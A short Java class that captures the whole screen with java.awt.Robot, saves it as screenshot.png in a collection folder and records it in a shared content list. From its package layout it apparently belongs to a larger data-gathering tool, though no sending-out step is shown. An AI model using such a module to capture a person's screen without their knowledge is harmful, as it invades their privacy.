package itzgonza.hollyshit.impl.system;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.File;

import javax.imageio.ImageIO;

import itzgonza.hollyshit.utils.utilities;

public class Screenshot extends utilities {

    public void initialize() throws Exception {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        
        File screenshotFile = new File(getFolder() + "/screenshot.png");
        ImageIO.write(robot.createScreenCapture(screenRect), "png", screenshotFile);
        content.add("screenshot");
    }
}